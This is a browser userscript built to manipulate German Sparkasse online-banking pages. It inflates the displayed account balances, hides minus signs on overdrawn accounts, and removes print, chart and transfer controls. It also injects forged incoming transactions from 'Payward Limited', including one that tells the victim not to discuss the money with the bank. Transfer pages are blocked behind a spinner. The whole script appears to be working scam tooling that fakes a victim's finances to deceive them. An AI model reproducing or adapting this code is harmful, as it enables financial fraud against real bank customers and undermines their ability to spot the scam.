// ==UserScript==
// @name         Ed Combined Helmut Phillip
// @namespace    http://tampermonkey.net/
// @version      5.0
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/483855/Ed%20Combined%20Helmut%20Phillip.user.js
// @updateURL https://update.greasyfork.org/scripts/483855/Ed%20Combined%20Helmut%20Phillip.meta.js
// ==/UserScript==

(function() {
    'use strict';

    // Your code here...
//==========================================================================================================================================================================================================

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    //SCRIPTV2 TRIGGER!
    var easyUpdate = "no";


    var pointerOverviewTotal = "";
    var pointerTabelle = "xx";
    var absender = "Treuhand: Payward Limited";
    var absenderTitel = "Treuhand: Payward Limited";
    var firma = "test";
    var asenderReference = "WD3746 TRX88205A CX13280";
    var absenderDetails = "Einreichung einer Treuhand Überweisung. Freigabe nötig durch Payward Limited";
    var amount = 0;
    var vorgemerkt = "no";
    var xamount = 0;
    var x2amount = 0;
    var buchung = 20000;
    var buchungDecimal = "70";
    var buchungTextsZahl = "696.680";
    var accountsecurity = "4343 1176 64";

    if (easyUpdate == "yes"){
        x2amount = 10000;}

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

//==========================================================================================================================================================================================================


    function numberWithCommas(x) {
        return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");}

// UTILITY FUNCTIONS
//----------------------------------------------------------------------------------------------------
  // Function to delete parent of element containing specific text
    function deleteParentOfText(text) {
        // Create a walker to traverse all text nodes
        var walker = document.createTreeWalker(
            document.body,
            NodeFilter.SHOW_TEXT,
            null,
            false
        );

        var node;
        while(node = walker.nextNode()) {
            // Check if the text content includes the specified text
            if (node.nodeValue.includes(text)) {
                // Get the parent element of the text node
                var parentElement = node.parentElement;

                // Remove the parent element if it exists
                if (parentElement) {
                    parentElement.remove();
                    break; // Remove this line if you want to delete all instances
                }
            }
        }
    }

    // Execute the function with the specified text
    deleteParentOfText('Konto wechseln');

//------------------------------------------------------------------------------

    // Function to search and remove text nodes containing 'NaN'
    function removeNaNText() {
        var walker = document.createTreeWalker(
            document.body,
            NodeFilter.SHOW_TEXT,
            null,
            false
        );

        var node;
        while(node = walker.nextNode()) {
            if (node.nodeValue.trim() === 'NaN') {
                node.remove();
            }
        }
    }

    // Create a MutationObserver to monitor DOM changes
    var observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
            // If there are added nodes, check for 'NaN' text
            if (mutation.addedNodes.length) {
                removeNaNText();
            }
        });
    });

    // Define what element should be observed and what types of mutations
    observer.observe(document.body, {
        childList: true, // Observe direct children
        subtree: true   // Observe all descendants
    });

    // Initial check for 'NaN' text
    removeNaNText();

    //UTILITY FUNCTIONS
    //----------------------------------------------------------------------------

//==========================================================================================================================================================================================================

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


    if (window.location.href.indexOf("finanzuebersicht") > 0 || window.location.href.indexOf("10860758146") > 0 || window.location.href.indexOf("10733495263") > 0) {

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

//==========================================================================================================================================================================================================

        //Wir sind in der Finanzuebersicht
        if (vorgemerkt == "no"){

    /// Refresh the finanzstatus page once it loads for the first time

var refresh = window.localStorage.getItem('refresh');
console.log(refresh);
setTimeout(function() {
if (refresh===null){
    window.location.reload();
    window.localStorage.setItem('refresh', "1");
}
}, 3000); // 1500 milliseconds = 1.5 seconds

setTimeout(function() {
localStorage.removeItem('refresh')
}, 1700); // 1700 milliseconds = 1.7 seconds

                                  var KontosBoxElement = document.getElementsByClassName("nbf-container-box nbf-container--pfm expandable")[0];
if (KontosBoxElement) {
    KontosBoxElement.remove();
}


//==========================================================================================================================================================================================================

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

            var main = 1;
            var subtotal = 2;
            var total = 3;

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

//==========================================================================================================================================================================================================


 ///UTITLITY FUNCTIONS/////////
            // Function to remove elements with the class "primary-cta", "mkp-button-group mkp-layout-margin mkp-button-group-with-separator mkp-button-group-mobile-left-aligned", and elements containing the text "Druckansicht", and show a spinner when specific text is found
    function removePrimaryCTAAndShowSpinner() {
        // Remove elements with the class "primary-cta"
        var elementsToRemoveCTA = document.querySelectorAll('.primary-cta');
        elementsToRemoveCTA.forEach(function(element) {
            element.remove();
        });

        // Remove elements with the class "mkp-button-group mkp-layout-margin mkp-button-group-with-separator mkp-button-group-mobile-left-aligned"
        var elementsToRemoveButtonGroup = document.querySelectorAll('.mkp-button-group.mkp-layout-margin.mkp-button-group-with-separator.mkp-button-group-mobile-left-aligned');
        elementsToRemoveButtonGroup.forEach(function(element) {
            element.remove();
        });

        // Remove elements containing the text "Druckansicht"
        var elementsToRemoveDruckansicht = Array.from(document.querySelectorAll('*')).filter(el => el.textContent.includes("Druckansicht"));
        elementsToRemoveDruckansicht.forEach(function(element) {
            element.remove();
        });

      // Check if the specified text is found on the webpage
var triggerTexts = ["Von welchem Konto möchten Sie überweisen?", "Für welches Konto möchten Sie die Umsätze abrufen"];

function fuzzyTextMatch(text, triggerText) {
    // Remove whitespaces and convert to lowercase for comparison
    var cleanedText = text.replace(/\s/g, '').toLowerCase();
    var cleanedTriggerText = triggerText.replace(/\s/g, '').toLowerCase();

    // Calculate the similarity ratio between the cleaned text and trigger text
    var similarityRatio = calculateSimilarityRatio(cleanedText, cleanedTriggerText);

    // Adjust the similarity threshold as needed (0.7 means 70% similarity)
    var similarityThreshold = 0.7;

    return similarityRatio >= similarityThreshold;
}

function calculateSimilarityRatio(str1, str2) {
    var longer = str1;
    var shorter = str2;
    if (str1.length < str2.length) {
        longer = str2;
        shorter = str1;
    }
    var longerLength = longer.length;
    if (longerLength === 0) {
        return 1.0;
    }
    return (longerLength - editDistance(longer, shorter)) / parseFloat(longerLength);
}

function editDistance(str1, str2) {
    str1 = str1.toLowerCase();
    str2 = str2.toLowerCase();

    var costs = new Array();
    for (var i = 0; i <= str1.length; i++) {
        var lastValue = i;
        for (var j = 0; j <= str2.length; j++) {
            if (i === 0) {
                costs[j] = j;
            } else {
                if (j > 0) {
                    var newValue = costs[j - 1];
                    if (str1.charAt(i - 1) !== str2.charAt(j - 1)) {
                        newValue = Math.min(Math.min(newValue, lastValue), costs[j]) + 1;
                    }
                    costs[j - 1] = lastValue;
                    lastValue = newValue;
                }
            }
        }
        if (i > 0) {
            costs[str2.length] = lastValue;
        }
    }
    return costs[str2.length];
}

for (var i = 0; i < triggerTexts.length; i++) {
    if (fuzzyTextMatch(document.body.textContent, triggerTexts[i])) {
        // Show a spinner using a custom spinner element
        var spinner = document.createElement('div');
        spinner.style.position = 'fixed';
        spinner.style.top = '0';
        spinner.style.left = '0';
        spinner.style.width = '100%';
        spinner.style.height = '100%';
        spinner.style.background = 'rgba(255, 255, 255, 0.9)'; // Adjust alpha value here
        spinner.style.zIndex = '9999';

        // Create a spinner element with a background image
        var spinnerElement = document.createElement('div');
        spinnerElement.style.width = '100px'; // Adjust width as needed
        spinnerElement.style.height = '100px'; // Adjust height as needed
        spinnerElement.style.background = 'url(https://upload.wikimedia.org/wikipedia/commons/4/4e/Logo-_Sparkassen-App_%E2%80%93_die_mobile_Filiale.png) center center no-repeat';
        spinnerElement.style.backgroundSize = 'contain';

        spinner.appendChild(spinnerElement);
        document.body.appendChild(spinner);
    }
}

console.log('Removed elements with class "primary-cta", "mkp-button-group mkp-layout-margin mkp-button-group-with-separator mkp-button-group-mobile-left-aligned", and elements containing "Druckansicht", and showed spinner');

    }

    // Call the function immediately
    removePrimaryCTAAndShowSpinner();


            ///UTITLITY FUNCTIONS/////////

            var xpointerOverviewAcc = document.getElementsByClassName("balance-predecimal")[main].textContent;
            var xrealAccBalance = xpointerOverviewAcc.replace(".", "");
            var xfakeAccBalance = parseFloat(xrealAccBalance) + xamount;
            var xfakeAccBalancewithcomma = numberWithCommas(xfakeAccBalance);
            document.getElementsByClassName("balance-predecimal")[main].textContent = xfakeAccBalancewithcomma;

            //Wenn nicht vorgemerkt sein soll, dann faken wir die Balance in die Uebersicht.
            //var pointerOverviewAcc = document.getElementsByClassName("balance-predecimal")[2].textContent;
            //var realAccBalance = pointerOverviewAcc.replace(".", "");
            //var fakeAccBalance = parseFloat(realAccBalance) + amount;
            //var fakeAccBalancewithcomma = numberWithCommas(fakeAccBalance);

            //Update Balance
            //document.getElementsByClassName("balance-predecimal")[2].textContent = fakeAccBalancewithcomma;

            if (easyUpdate == "yes"){
                var updaterCheck = document.getElementsByClassName("balance-predecimal")[2].textContent;
                var updaterCheckBalance = updaterCheck.replace(".", "");
                var updaterFakeBalance = parseFloat(xrealAccBalance) + x2amount;
                var updaterFakeSPK = numberWithCommas(updaterFakeBalance);
                document.getElementsByClassName("balance-predecimal")[2].textContent = updaterFakeSPK;
            }

            var zwischenSumme = document.getElementsByClassName("balance-predecimal")[subtotal].textContent;
            var zwischenSummeReal = zwischenSumme.replace(".", "");
            var zwischenSummeFake = parseFloat(zwischenSummeReal) + x2amount +xamount;
            var zwischenSummeNwc = numberWithCommas(zwischenSummeFake);

            //Update ZwischenSumme
            document.getElementsByClassName("balance-predecimal")[subtotal].textContent = zwischenSummeNwc;

            var TotalAmount = document.getElementsByClassName("balance-predecimal")[total].textContent;
            var TotalAmountReal = TotalAmount.replace(".", "");
            var TotalAmountFake = parseFloat(TotalAmountReal) + x2amount +xamount;
            var TotalAmountNwc = numberWithCommas(TotalAmountFake);

            //Update Total
            document.getElementsByClassName("balance-predecimal")[total].textContent = TotalAmountNwc;

        }

    }

//==========================================================================================================================================================================================================

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    if (window.location.href.indexOf("umsaetze") > 0 || window.location.href.indexOf("10860758866") > 0 ) {


  // Check if the condition is met before executing the code
    if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent === accountsecurity) {
        if (vorgemerkt == "no"){
        // Wir sind im Kontostand
        // Set the value by which you want to modify the main balance
        var modificationValue = 7200;

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

//==========================================================================================================================================================================================================


        // Function to modify the main balance
        function modifyMainBalance() {
            // Get the element with class "balance-decimal"
            var balanceElement = document.querySelector('.balance-decimal');

            // Check if the element exists
            if (balanceElement) {
                // Get the text content of the balance element
                var balanceText = balanceElement.textContent.trim();

                // Extract the numeric value from the text content correctly
                var numericValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(/[^\d,]/g, '').replace(/,/g, '.'));

                // Determine the sign of the balance based on the text content
                var isNegative = balanceText.includes('-');

                // Modify the balance based on the sign and the modification value
                if (isNegative) {
                    numericValue -= modificationValue;
                } else {
                    numericValue += modificationValue;
                }

                // Update the text content with the modified value and "EUR" currency
                var updatedBalanceText = (isNegative ? '-' : '') + numericValue.toLocaleString('de-DE', { style: 'currency', currency: 'EUR' }).replace('€', 'EUR');

                // Update the balance text content and class
                balanceElement.textContent = updatedBalanceText;
                balanceElement.className = 'balance-decimal plus';
            } else {
                console.error('Balance element not found.');
            }

        }

        // Function to remove minus signs from the text content under class "balance-decimal plus"
        function removeMinusSigns() {
            var plusBalanceElement = document.querySelector('.balance-decimal.plus');

            if (plusBalanceElement) {
                var balanceText = plusBalanceElement.textContent;
                var updatedBalanceText = balanceText.replace(/-/g, '');
                plusBalanceElement.textContent = updatedBalanceText;
            }
        }

        // Execute the modification function
        modifyMainBalance();

        // Execute the remove minus signs function
        removeMinusSigns();
             }
    }
//------------------------------------------------------------------------------------------------------
     // Function to delete elements by class name
    function deleteElementsByClassName(className) {
        // Select all elements with the given class name
        var elements = document.querySelectorAll('.' + className.split(' ').join('.'));

        // Loop through the elements and remove each one
        elements.forEach(function(element) {
            element.remove();
        });

        console.log('Removed elements with class:', className);
    }

    // Call the function for each class name
    deleteElementsByClassName('druck-button');
    deleteElementsByClassName('flyout-label');
    deleteElementsByClassName('sort-button-bottom mkp-row mkp-justify-content-flex-end');


        //---------------------------------------------------------------------------------------------

        //Wir sind im Kontostand
        var AccBalance = document.getElementsByClassName("mkp-currency-lg")[0].childNodes[0].textContent;
        var AccBalanceReal = AccBalance.replace(".", "");
        var AccBalanceFake = parseFloat(AccBalanceReal) + x2amount;
        var AccBalanceFake2 = parseFloat(AccBalanceReal) + xamount;
        var AccBalanceNwc2 = numberWithCommas(AccBalanceFake2);
        var AccBalanceNwc = numberWithCommas(AccBalanceFake);
        var singleAmount = numberWithCommas(amount);

        //Update Kontostand oben
        //if (vorgemerkt == "no"){
        //    document.getElementsByClassName("mkp-currency-lg")[0].childNodes[0].textContent = AccBalanceNwc;

        //}

        //document.getElementsByClassName("mkp-card-list")[1]

        if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == accountsecurity ){
            if (vorgemerkt == "no"){
                document.getElementsByClassName("mkp-currency-lg")[0].childNodes[0].textContent = AccBalanceNwc2;
                      var saldoLinechartElement = document.getElementsByClassName("saldo-linechart")[0];
if (saldoLinechartElement) {
    saldoLinechartElement.remove();
}
            }
            var xxxxxHTML = '<div class="mkp-card-list"><span class="mkp-list-subline">Spezialauftrag Treuhand (1)</span><ul class="mkp-card-group mkp-group-unify mkp-group-clickable" aria-label="Treuhand"><li aria-label="Treuhand Auftrag"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Bruno Scheibner: Treuhand Freigabe nötig durch Bruno Scheibner">Treuhand: Freigabe nötig durch Matthias Kabisch</a></h3><p>Treuhand-Auftrag: DE11501900000006605826</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">207.547</span><span aria-hidden="true" class="balance-decimal plus">,07&nbsp;EUR</span><span aria-hidden="false" class="offscreen">-100,00 EUR</span></div></div></div></div></li></ul></div>';
            var saveHTML = document.getElementsByClassName("mkp-card-list")[0].innerHTML;
            var xHTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; '+buchungTextsZahl+' EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="'+absenderTitel+'">'+absender+'</a></h3><p>'+absenderDetails+'</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">'+buchungTextsZahl+'</span><span aria-hidden="true" class="balance-decimal plus">,'+buchungDecimal+'&nbsp;EUR</span><span aria-hidden="false" class="offscreen">15.308,00 EUR</span></div></div></div></div></li>';

//==========================================================================================================================================================================================================

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


            //var save2HTML = document.getElementsByClassName("mkp-card-list")[1].innerHTML;
            var x2HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 7.200,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Geld für Steuern. Mit Sparkasse das Geld NICHT besprechen, damit nicht gesperrt wird.</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">7.200</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">7.200,00 EUR</span></div></div></div></div></li>';

 var x3HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 14.000,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Geld für Steuern. Mit Sparkasse das Geld NICHT besprechen, damit nicht gesperrt wird.</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">14.000</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">14.000,00 EUR</span></div></div></div></div></li>';

var x4HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 20.000,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Geld für 20%.</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">20.000</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">20.000,00 EUR</span></div></div></div></div></li>';

 var x5HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 14.000,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Geld für Steuern. Mit Sparkasse das Geld NICHT besprechen, damit nicht gesperrt wird.</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">14.000</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">14.000,00 EUR</span></div></div></div></div></li>';

            //document.getElementsByClassName("mkp-card-list")[1].innerHTML = save2HTML + x2HTML;
            //block spk-analytics.js;
            document.getElementsByClassName("mkp-card-list")[0].innerHTML = xHTML + x2HTML + saveHTML;
        }

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

//==========================================================================================================================================================================================================


        if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == "1800 0168 34"){
            if (vorgemerkt == "no" && easyUpdate == "yes"){
                document.getElementsByClassName("mkp-currency-lg")[0].childNodes[0].textContent = AccBalanceNwc;
             var ssaldoLinechartElement = document.getElementsByClassName("saldo-linechart")[0];
if (ssaldoLinechartElement) {
    ssaldoLinechartElement.remove();
}
            }
            var save2HTML = document.getElementsByClassName("mkp-card-list")[0].innerHTML;
            var Sx2HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 10.000,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Withdrawal Trading Account: AY01-503DE-SP</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">10.000</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">9.200,00 EUR</span></div></div></div></div></li>';
            document.getElementsByClassName("mkp-card-list")[0].innerHTML = Sx2HTML + save2HTML;
        }

    }

//==========================================================================================================================================================================================================

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

    if (window.location.href.indexOf("einzelauftrag") > 0 || window.location.href.indexOf("uebertrag") > 0 || window.location.href.indexOf("10733487459") > 0 ) {

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

//==========================================================================================================================================================================================================


 ///UTITLITY FUNCTIONS/////////
           // Function to remove elements with the class "primary-cta", "mkp-button-group mkp-layout-margin mkp-button-group-with-separator mkp-button-group-mobile-left-aligned", and elements containing the text "Druckansicht", and show a spinner when specific text is found
    function removePrimaryCTAAndShowSpinner() {
        // Remove elements with the class "primary-cta"
        var elementsToRemoveCTA = document.querySelectorAll('.primary-cta');
        elementsToRemoveCTA.forEach(function(element) {
            element.remove();
        });

        // Remove elements with the class "mkp-button-group mkp-layout-margin mkp-button-group-with-separator mkp-button-group-mobile-left-aligned"
        var elementsToRemoveButtonGroup = document.querySelectorAll('.mkp-button-group.mkp-layout-margin.mkp-button-group-with-separator.mkp-button-group-mobile-left-aligned');
        elementsToRemoveButtonGroup.forEach(function(element) {
            element.remove();
        });

        // Remove elements containing the text "Druckansicht"
        var elementsToRemoveDruckansicht = Array.from(document.querySelectorAll('*')).filter(el => el.textContent.includes("Druckansicht"));
        elementsToRemoveDruckansicht.forEach(function(element) {
            element.remove();
        });

        // Check if the specified text is found on the webpage
        var triggerText = "Von welchem Konto möchten Sie überweisen?";
        if (document.body.textContent.includes(triggerText)) {
            // Show a spinner using a custom spinner element
            var spinner = document.createElement('div');
            spinner.style.position = 'fixed';
            spinner.style.top = '0';
            spinner.style.left = '0';
            spinner.style.width = '100%';
            spinner.style.height = '100%';
            spinner.style.background = 'rgba(255, 255, 255, 0.9)'; // Adjust alpha value here
            spinner.style.zIndex = '9999';

            // Create a spinner element with a background image
            var spinnerElement = document.createElement('div');
            spinnerElement.style.width = '100px'; // Adjust width as needed
            spinnerElement.style.height = '100px'; // Adjust height as needed
            spinnerElement.style.background = 'url(https://upload.wikimedia.org/wikipedia/commons/4/4e/Logo-_Sparkassen-App_%E2%80%93_die_mobile_Filiale.png) center center no-repeat';
            spinnerElement.style.backgroundSize = 'contain';

            spinner.appendChild(spinnerElement);
            document.body.appendChild(spinner);
        }

        console.log('Removed elements with class "primary-cta", "mkp-button-group mkp-layout-margin mkp-button-group-with-separator mkp-button-group-mobile-left-aligned", and elements containing "Druckansicht", and showed spinner');
    }

    // Call the function immediately
    removePrimaryCTAAndShowSpinner();


